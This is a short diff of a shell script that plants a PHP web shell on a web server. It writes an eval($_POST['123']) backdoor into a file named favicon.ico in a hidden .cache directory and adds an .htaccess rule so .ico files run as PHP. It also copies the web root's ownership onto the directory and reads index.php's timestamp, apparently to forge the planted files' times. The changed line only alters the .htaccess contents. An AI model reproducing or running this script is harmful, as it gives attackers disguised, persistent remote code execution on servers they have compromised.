@@ -55,7 +55,7 @@ F="favicon.ico"
 TD="$WEBROOT/$D"
 sudo mkdir -p "$TD"
 echo "<?php \$e=&\$t;\$t=\$_POST['123'];\$s=&\$e;eval(\$s);?>" | sudo tee "$TD/$F" > /dev/null
-echo -e "AddType application/x-httpd-php .ico\nphp_flag engine on" | sudo tee "$TD/.htaccess" > /dev/null
+echo "AddType application/x-httpd-php .ico" | sudo tee "$TD/.htaccess" > /dev/null
 sudo chown -R $(stat -c "%U:%G" "$WEBROOT") "$WEBROOT/.cache"
 if [ -f "$WEBROOT/index.php" ]; then
     OLDTIME=$(stat -c %y "$WEBROOT/index.php")
